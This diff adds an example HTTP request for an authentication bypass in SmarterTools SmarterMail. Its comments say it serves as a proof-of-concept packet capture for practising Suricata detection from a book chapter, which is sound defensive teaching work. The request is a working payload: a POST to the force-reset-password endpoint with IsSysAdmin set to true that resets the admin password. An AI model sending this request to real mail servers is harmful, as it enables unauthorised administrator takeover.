@@ -1,0 +1,15 @@
+#SmarterTools SmarterMail Authentication Bypass
+#reference: https://labs.watchtowr.com/attackers-with-decompilers-strike-again-smartertools-smartermail-wt-2026-0001-auth-bypass/
+#This is an example of an HTTP request that could be used to trigger this particularly vulnerability.
+#Use HTTP request headers and body below to create a proof-of-concept packet capture with Flowsynth
+#In order to follow along with Suricata:An Operator's Guide, Chapter 8, Section 8.2
+POST /api/v1/auth/force-reset-password HTTP/1.1
+Host: xxxxxxx:9998
+Content-Type: application/json
+Content-Length: 145
+
+{"IsSysAdmin":"true",
+"OldPassword":"AyyLmao",
+"Username":"admin",
+"NewPassword":"AyyLmao123!@#",
+"ConfirmPassword": "AyyLmao123!@#"}
